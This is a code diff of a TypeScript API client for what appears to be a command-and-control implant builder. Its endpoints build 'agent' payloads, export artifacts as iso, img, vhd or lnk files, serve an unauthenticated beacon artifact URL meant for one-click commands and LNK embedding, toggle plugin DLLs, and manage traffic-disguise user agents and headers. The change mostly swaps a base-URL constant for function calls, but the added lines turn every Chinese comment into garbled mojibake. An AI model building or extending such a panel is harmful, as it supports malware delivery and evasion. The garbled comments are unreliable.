@@ -1,13 +1,11 @@
-import { getToken, API_ORIGIN } from './client';
+﻿import { getToken, apiBase, getApiOrigin } from './client';
 import type { BuildConfigRequest, BuildRecord, BuildRecordDetail, TemplateInfo } from '../types/models';
-
-const API_BASE = `${API_ORIGIN}/api`;
 
 export async function uploadIcon(file: File): Promise<string> {
   const formData = new FormData();
   formData.append('file', file);
 
-  const response = await fetch(`${API_BASE}/builder/upload-icon`, {
+  const response = await fetch(`${apiBase()}/builder/upload-icon`, {
     method: 'POST',
     headers: {
       Authorization: `Bearer ${getToken()}`,
@@ -25,7 +23,7 @@ export async function uploadIcon(file: File): Promise<string> {
 }
 
 export async function startBuild(config: BuildConfigRequest): Promise<string> {
-  const response = await fetch(`${API_BASE}/builder/build`, {
+  const response = await fetch(`${apiBase()}/builder/build`, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -44,11 +42,11 @@ export async function startBuild(config: BuildConfigRequest): Promise<string> {
 }
 
 export function getBuildStreamUrl(buildId: string): string {
-  return `${API_BASE}/builder/stream/${buildId}?token=${encodeURIComponent(getToken() || '')}`;
+  return `${apiBase()}/builder/stream/${buildId}?token=${encodeURIComponent(getToken() || '')}`;
 }
 
 export async function listBuilds(): Promise<BuildRecord[]> {
-  const response = await fetch(`${API_BASE}/builder/list`, {
+  const response = await fetch(`${apiBase()}/builder/list`, {
     headers: { Authorization: `Bearer ${getToken()}` },
   });
 
@@ -60,7 +58,7 @@ export async function listBuilds(): Promise<BuildRecord[]> {
 }
 
 export async function getBuildInfo(buildId: string): Promise<BuildRecordDetail> {
-  const response = await fetch(`${API_BASE}/builder/info/${buildId}`, {
+  const response = await fetch(`${apiBase()}/builder/info/${buildId}`, {
     headers: { Authorization: `Bearer ${getToken()}` },
   });
 
@@ -72,22 +70,22 @@ export async function getBuildInfo(buildId: string): Promise<BuildRecordDetail> 
 }
 
 export function getBuildDownloadUrl(buildId: string): string {
-  return `${API_BASE}/builder/download/${buildId}?token=${encodeURIComponent(getToken() || '')}`;
+  return `${apiBase()}/builder/download/${buildId}?token=${encodeURIComponent(getToken() || '')}`;
 }
 
-/** 按格式下载构建产物（iso/img/vhd/lnk；缺省 = 原始 exe）。 */
+/** 鎸夋牸寮忎笅杞芥瀯寤轰骇鐗╋紙iso/img/vhd/lnk锛涚己鐪?= 鍘熷 exe锛夈€?*/
 export function getBuildDownloadUrlByFormat(buildId: string, format: string): string {
   const token = encodeURIComponent(getToken() || '');
-  return `${API_BASE}/builder/download/${buildId}?token=${token}&format=${encodeURIComponent(format)}`;
+  return `${apiBase()}/builder/download/${buildId}?token=${token}&format=${encodeURIComponent(format)}`;
 }
 
-/** 匿名下载 URL（无需鉴权，供一键命令 / LNK 内嵌使用；删除构建即失效）。 */
+/** 鍖垮悕涓嬭浇 URL锛堟棤闇€閴存潈锛屼緵涓€閿懡浠?/ LNK 鍐呭祵浣跨敤锛涘垹闄ゆ瀯寤哄嵆澶辨晥锛夈€?*/
 export function getArtifactUrl(buildId: string): string {
-  return `${API_ORIGIN}/api/beacon/artifact/${buildId}`;
+  return `${getApiOrigin()}/api/beacon/artifact/${buildId}`;
 }
 
 export async function deleteBuild(buildId: string): Promise<void> {
-  const response = await fetch(`${API_BASE}/builder/${buildId}`, {
+  const response = await fetch(`${apiBase()}/builder/${buildId}`, {
     method: 'DELETE',
     headers: { Authorization: `Bearer ${getToken()}` },
   });
@@ -99,7 +97,7 @@ export async function deleteBuild(buildId: string): Promise<void> {
 }
 
 export async function listTemplates(): Promise<TemplateInfo[]> {
-  const response = await fetch(`${API_BASE}/builder/template`, {
+  const response = await fetch(`${apiBase()}/builder/template`, {
     headers: { Authorization: `Bearer ${getToken()}` },
   });
 
@@ -112,7 +110,7 @@ export async function uploadTemplate(file: File, platform: string): Promise<Temp
   formData.append('file', file);
   formData.append('platform', platform);
 
-  const response = await fetch(`${API_BASE}/builder/template/upload`, {
+  const response = await fetch(`${apiBase()}/builder/template/upload`, {
     method: 'POST',
     headers: { Authorization: `Bearer ${getToken()}` },
     body: formData,
@@ -127,7 +125,7 @@ export async function uploadTemplate(file: File, platform: string): Promise<Temp
 }
 
 export async function deleteTemplate(platform: string): Promise<void> {
-  const response = await fetch(`${API_BASE}/builder/template/${platform}`, {
+  const response = await fetch(`${apiBase()}/builder/template/${platform}`, {
     method: 'DELETE',
     headers: { Authorization: `Bearer ${getToken()}` },
   });
@@ -138,9 +136,9 @@ export async function deleteTemplate(platform: string): Promise<void> {
   }
 }
 
-/** 仅构建云模块（不构建 agent）。返回 buildId（历史/日志流用）。 */
+/** 浠呮瀯寤轰簯妯″潡锛堜笉鏋勫缓 agent锛夈€傝繑鍥?buildId锛堝巻鍙?鏃ュ織娴佺敤锛夈€?*/
 export async function buildModules(platform: string, enabledModules: string[]): Promise<string> {
-  const response = await fetch(`${API_BASE}/builder/modules`, {
+  const response = await fetch(`${apiBase()}/builder/modules`, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -163,9 +161,9 @@ export interface ModuleEntry {
   enabled: boolean;
 }
 
-/** 枚举平台模块（文件名驱动，含插件 dll）：{name, enabled}[]。 */
+/** 鏋氫妇骞冲彴妯″潡锛堟枃浠跺悕椹卞姩锛屽惈鎻掍欢 dll锛夛細{name, enabled}[]銆?*/
 export async function listModules(platform: string): Promise<ModuleEntry[]> {
-  const response = await fetch(`${API_BASE}/builder/modules?platform=${encodeURIComponent(platform)}`, {
+  const response = await fetch(`${apiBase()}/builder/modules?platform=${encodeURIComponent(platform)}`, {
     headers: { Authorization: `Bearer ${getToken()}` },
   });
   if (!response.ok) throw new Error(`Failed to list modules (HTTP ${response.status})`);
@@ -173,9 +171,9 @@ export async function listModules(platform: string): Promise<ModuleEntry[]> {
   return data.modules ?? [];
 }
 
-/** 启用/禁用模块（重命名 .dll ↔ .dll.disable）。 */
+/** 鍚敤/绂佺敤妯″潡锛堥噸鍛藉悕 .dll 鈫?.dll.disable锛夈€?*/
 export async function toggleModule(platform: string, name: string, enabled: boolean): Promise<void> {
-  const response = await fetch(`${API_BASE}/builder/modules/toggle`, {
+  const response = await fetch(`${apiBase()}/builder/modules/toggle`, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -189,7 +187,7 @@ export async function toggleModule(platform: string, name: string, enabled: bool
   }
 }
 
-// ── 流量伪装持久化列表 ────────────────────────────────────────────────
+// 鈹€鈹€ 娴侀噺浼鎸佷箙鍖栧垪琛?鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€
 
 export interface BuildListItem {
   id: string;
@@ -206,7 +204,7 @@ export interface BuildTrafficLists {
 export type TrafficListName = 'userAgents' | 'extraHeaders' | 'pathSuffixes';
 
 export async function getBuildLists(): Promise<BuildTrafficLists> {
-  const response = await fetch(`${API_BASE}/builder/lists`, {
+  const response = await fetch(`${apiBase()}/builder/lists`, {
     headers: { Authorization: `Bearer ${getToken()}` },
   });
   if (!response.ok) throw new Error(`Failed to load lists (HTTP ${response.status})`);
@@ -214,7 +212,7 @@ export async function getBuildLists(): Promise<BuildTrafficLists> {
 }
 
 export async function addBuildListItem(list: TrafficListName, value: string): Promise<BuildTrafficLists> {
-  const response = await fetch(`${API_BASE}/builder/lists/item`, {
+  const response = await fetch(`${apiBase()}/builder/lists/item`, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -230,7 +228,7 @@ export async function addBuildListItem(list: TrafficListName, value: string): Pr
 }
 
 export async function toggleBuildListItem(list: TrafficListName, id: string, enabled: boolean): Promise<BuildTrafficLists> {
-  const response = await fetch(`${API_BASE}/builder/lists/toggle`, {
+  const response = await fetch(`${apiBase()}/builder/lists/toggle`, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -246,7 +244,7 @@ export async function toggleBuildListItem(list: TrafficListName, id: string, ena
 }
 
 export async function deleteBuildListItem(list: TrafficListName, id: string): Promise<BuildTrafficLists> {
-  const response = await fetch(`${API_BASE}/builder/lists/delete`, {
+  const response = await fetch(`${apiBase()}/builder/lists/delete`, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
